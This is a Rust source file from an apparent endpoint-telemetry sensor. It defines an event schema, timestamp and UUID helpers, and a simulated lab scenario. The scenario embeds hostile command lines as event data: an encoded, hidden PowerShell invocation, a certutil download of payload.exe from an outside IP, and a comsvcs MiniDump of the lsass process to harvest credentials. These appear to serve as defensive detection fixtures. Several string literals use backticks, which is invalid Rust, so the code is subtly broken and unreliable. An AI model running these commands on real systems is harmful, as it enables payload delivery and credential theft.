// normalize.rs: maps raw telemetry to the unified event schema shared
// with the Go engine (docs/architecture, chapter 4). Field names and
// nesting must stay byte-compatible with pkg/model/model.go.

use serde::Serialize;
use std::time::{SystemTime, UNIX_EPOCH};

#[derive(Serialize, Clone, Debug)]
pub struct HashesJson(pub serde_json::Map<String, serde_json::Value>);

#[derive(Serialize, Clone, Debug)]
pub struct ProcessJson {
    pub pid: i32,
    #[serde(skip_serializing_if = "is_zero")]
    pub ppid: i32,
    pub name: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub command_line: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub image: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub hashes: Option<HashesJson>,
}

#[derive(Serialize, Clone, Debug)]
pub struct NetworkJson {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub protocol: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub source_ip: Option<String>,
    #[serde(skip_serializing_if = "is_zero")]
    pub source_port: i32,
    pub destination_ip: String,
    #[serde(skip_serializing_if = "is_zero")]
    pub destination_port: i32,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub domain: Option<String>,
}

#[derive(Serialize, Clone, Debug)]
pub struct EventJson {
    pub id: String,
    pub timestamp: String, // RFC3339 with nanoseconds
    pub r#type: String,
    pub source: String,
    pub host: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub user: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub process: Option<ProcessJson>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub network: Option<NetworkJson>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub tags: Vec<String>,
}

pub const TYPE_PROCESS_CREATE: &str = "process.create";
pub const TYPE_PROCESS_TERMINATE: &str = "process.terminate";
pub const TYPE_NETWORK_CONNECT: &str = "network.connect";

pub fn now_rfc3339() -> String {
    let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default();
    let secs = now.as_secs();
    let nanos = now.subsec_nanos();
    // RFC3339 without external crates: compute UTC date from unix time.
    let days = secs / 86_400;
    let rem = secs % 86_400;
    let (h, m, s) = (rem / 3600, (rem % 3600) / 60, rem % 60);
    let (y, mo, d) = civil_from_days(days as i64);
    format!("{y:04}-{mo:02}-{d:02}T{h:02}:{m:02}:{s:02}.{nanos:09}Z")
}

fn civil_from_days(z: i64) -> (i64, u32, u32) {
    let z = z + 719_468;
    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
    let doe = (z - era * 146_097) as u64;
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let y = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = (doy - (153 * mp + 2) / 5 + 1) as u32;
    let m = if mp < 10 { mp + 3 } else { mp - 9 } as u32;
    (if m <= 2 { y + 1 } else { y }, m, d)
}

pub fn new_uuid() -> String {
    // RFC 4122 v4-shaped id from a xorshift64* seeded by the clock;
    // keeps the sensor dependency-free in the tracer bullet. Phase 1
    // switches to the getrandom crate.
    use std::time::{SystemTime, UNIX_EPOCH};
    let mut seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0x9e37_79b9_7f4a_7c15)
        | 1;
    let mut next = || {
        seed ^= seed << 13;
        seed ^= seed >> 7;
        seed ^= seed << 17;
        seed
    };
    let a = next();
    let b = next();
    format!(
        "{:08x}-{:04x}-4{:03x}-{:04x}-{:012x}",
        (a >> 32) as u32,
        ((a >> 16) & 0xffff) as u16,
        (a & 0x0fff) as u16,
        (0x8000 | ((b >> 48) & 0x0fff)) as u16,
        b & 0xffff_ffff_ffff
    )
}

/// Small lab scenario mirroring cmd/devsensor (benign + offensive TTPs).
pub fn simulate_scenario() -> Vec<EventJson> {
    vec![
        EventJson {
            id: new_uuid(),
            timestamp: now_rfc3339(),
            r#type: TYPE_PROCESS_CREATE.into(),
            source: "simulate".into(),
            host: "LAB-WKS-01".into(),
            user: Some("CORP\\jdoe".into()),
            process: Some(ProcessJson {
                pid: 4212, ppid: 4104, name: "notepad.exe".into(),
                command_line: Some(`"C:\Windows\system32\NOTEPAD.EXE" todo.txt`.into()),
                image: Some(`C:\Windows\System32\notepad.exe`.into()),
                hashes: None,
            }),
            network: None,
            tags: vec![],
        },
        EventJson {
            id: new_uuid(),
            timestamp: now_rfc3339(),
            r#type: TYPE_PROCESS_CREATE.into(),
            source: "simulate".into(),
            host: "LAB-WKS-01".into(),
            user: Some("CORP\\jdoe".into()),
            process: Some(ProcessJson {
                pid: 6612, ppid: 4104, name: "powershell.exe".into(),
                command_line: Some(
                    "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA".into(),
                ),
                image: Some(
                    `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`.into(),
                ),
                hashes: None,
            }),
            network: None,
            tags: vec!["ttp:offensive".into()],
        },
        EventJson {
            id: new_uuid(),
            timestamp: now_rfc3339(),
            r#type: TYPE_PROCESS_CREATE.into(),
            source: "simulate".into(),
            host: "LAB-WKS-01".into(),
            user: Some("CORP\\jdoe".into()),
            process: Some(ProcessJson {
                pid: 6688, ppid: 4104, name: "certutil.exe".into(),
                command_line: Some(
                    "certutil.exe -urlcache -split -f https://185.220.101.47/payload.exe C:\\Users\\Public\\payload.exe".into(),
                ),
                image: Some(`C:\Windows\System32\certutil.exe`.into()),
                hashes: None,
            }),
            network: None,
            tags: vec!["ttp:offensive".into()],
        },
        EventJson {
            id: new_uuid(),
            timestamp: now_rfc3339(),
            r#type: TYPE_PROCESS_CREATE.into(),
            source: "simulate".into(),
            host: "LAB-WKS-01".into(),
            user: Some("CORP\\jdoe".into()),
            process: Some(ProcessJson {
                pid: 6721, ppid: 6612, name: "rundll32.exe".into(),
                command_line: Some(
                    r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 744 C:\Windows\Temp\lsass.dmp full".into(),
                ),
                image: Some(`C:\Windows\System32\rundll32.exe`.into()),
                hashes: None,
            }),
            network: None,
            tags: vec!["ttp:offensive".into()],
        },
    ]
}

fn is_zero(v: &i32) -> bool {
    *v == 0
}
